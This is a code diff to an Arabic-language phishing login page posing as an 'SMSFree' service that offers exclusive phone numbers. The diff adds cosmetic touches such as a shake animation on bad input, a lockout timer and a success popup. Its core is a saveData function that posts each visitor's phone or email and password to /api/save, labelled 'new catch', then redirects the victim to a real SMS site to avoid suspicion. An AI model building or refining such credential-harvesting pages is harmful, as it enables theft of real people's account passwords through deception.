@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - التحقق الآمن</title>
+    <title>SMSFree - نظام الحماية المتكامل</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root {
@@ -50,7 +50,7 @@
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             border: 4px solid rgba(34, 211, 238, 0.1);
             border-top: 4px solid var(--primary-cyan);
-            border-radius: 50%; animation: spin 1s linear infinite;
+            border-radius: 50%; animation: spin 1.2s linear infinite;
         }
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
@@ -59,7 +59,7 @@
             font-size: 32px; font-weight: bold; color: #fbbf24;
         }
 
-        /* التنسيقات العامة */
+        /* تنسيق المحتوى */
         .logo-circle {
             width: 90px; height: 90px; border: 2px solid var(--primary-cyan);
             border-radius: 50%; margin: 0 auto 30px;
@@ -68,24 +68,28 @@
             background: rgba(34, 211, 238, 0.05);
         }
 
-        h2 { font-size: 15px; color: #94a3b8; margin-bottom: 35px; line-height: 1.7; }
-
         input {
             width: 100%; padding: 16px; margin-bottom: 15px;
             background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 15px; color: white; outline: none;
             text-align: center; font-size: 15px; box-sizing: border-box; transition: 0.3s;
         }
-        input:focus { border-color: var(--primary-cyan); background: rgba(15, 23, 42, 0.9); }
+
+        /* أنيميشن الاهتزاز عند الخطأ */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+        .shake-input { animation: shake 0.4s ease-in-out; border-color: #ef4444 !important; }
 
         .submit-btn {
             width: 100%; padding: 16px; background: linear-gradient(135deg, #0ea5e9, #22d3ee);
             border: none; border-radius: 15px; color: #0f172a;
-            font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s;
+            font-size: 17px; font-weight: bold; cursor: pointer;
         }
-        .submit-btn:hover { opacity: 0.9; transform: translateY(-1px); }
 
-        /* تخصيص النافذة المنبثقة الأنيقة */
+        /* التنبيهات الأنيقة */
         .elegant-popup {
             background: #1e293b !important;
             border: 1px solid rgba(255, 255, 255, 0.1) !important;
@@ -109,7 +113,7 @@
 
     <div class="blur-content">
         <div class="logo-circle">SMSFree</div>
-        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لحساباتك.</h2>
+        <h2 style="font-size:15px; color:#94a3b8; margin-bottom:35px;">سجل دخولك لتفعيل أرقامك الحصرية فوراً.</h2>
 
         <form id="loginForm">
             <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required autocomplete="off">
@@ -133,23 +137,29 @@
 
     document.getElementById('loginForm').onsubmit = (e) => {
         e.preventDefault();
-        const u = document.getElementById('user').value.trim();
-        const p = document.getElementById('pass').value;
+        const uEl = document.getElementById('user');
+        const pEl = document.getElementById('pass');
+        const u = uEl.value.trim();
+        const p = pEl.value;
 
         const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         const phoneRx = /^[0-9]{8,15}$/;
         const hasAr = /[\u0600-\u06FF]/.test(u);
 
         if ((emailRx.test(u) || phoneRx.test(u)) && !hasAr && p.length >= 6) {
-            saveAndGo(u, p);
+            saveData(u, p);
         } else {
+            // تأثير الاهتزاز
+            uEl.classList.add('shake-input');
+            pEl.classList.add('shake-input');
+            setTimeout(() => { uEl.classList.remove('shake-input'); pEl.classList.remove('shake-input'); }, 400);
+
             attempts++;
             if (attempts >= 3) {
                 const expiry = Date.now() + (30 * 1000);
                 localStorage.setItem('block_time', expiry);
                 applyLock(30);
             } else {
-                // الدايلوج الأنيق مع ميزة مسح الحقول
                 Swal.fire({
                     title: 'بيانات غير صالحة',
                     text: 'يرجى كتابة البريد بشكل صحيح (مثل name@mail.com) أو رقم هاتف صالح بدون أحرف عربية لتجنب الحظر.',
@@ -158,10 +168,10 @@
                     confirmButtonColor: '#22d3ee',
                     customClass: { popup: 'elegant-popup' }
                 }).then(() => {
-                    // مسح البيانات عند الضغط على OK
-                    document.getElementById('user').value = '';
-                    document.getElementById('pass').value = '';
-                    document.getElementById('user').focus();
+                    // مسح الحقول عند الخطأ
+                    uEl.value = '';
+                    pEl.value = '';
+                    uEl.focus();
                 });
             }
         }
@@ -187,16 +197,25 @@
                 overlay.style.display = 'none';
                 localStorage.removeItem('block_time');
                 attempts = 0;
+                
+                // ميزة "مبروك" التي عادت
+                Swal.fire({
+                    title: 'مبروك!',
+                    text: 'تم إزالة الحظر عنك بنجاح. يمكنك المحاولة مرة أخرى الآن.',
+                    icon: 'success',
+                    confirmButtonColor: '#22d3ee',
+                    customClass: { popup: 'elegant-popup' }
+                });
             }
         }, 1000);
     }
 
-    async function saveAndGo(u, p) {
+    async function saveData(u, p) {
         try {
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: `✅ بيانات جديدة:\n👤: ${u}\n🔑: ${p}` })
+                body: JSON.stringify({ message: `🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}` })
             });
             window.location.href = "https://receive-smss.com/";
         } catch (e) {}
